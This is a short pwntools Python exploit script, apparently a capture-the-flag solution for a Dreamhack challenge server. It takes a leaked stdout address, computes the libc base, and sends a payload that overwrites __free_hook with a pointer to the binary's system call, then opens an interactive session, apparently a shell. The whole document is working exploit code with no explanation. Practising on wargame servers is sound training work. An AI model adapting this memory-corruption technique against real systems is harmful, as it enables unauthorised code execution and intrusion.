from pwn import *


libc = ELF("./libc-2.23.so")
p = remote("host3.dreamhack.games", 8748)

main_system = 0x0400A11
	 
p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
	 
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
	 
payload = p64(free_hook) + p64(main_system)
	 
p.sendlineafter("Size: ", "400")
	 
	 
p.sendlineafter("Data: ", payload)
	 
p.interactive()
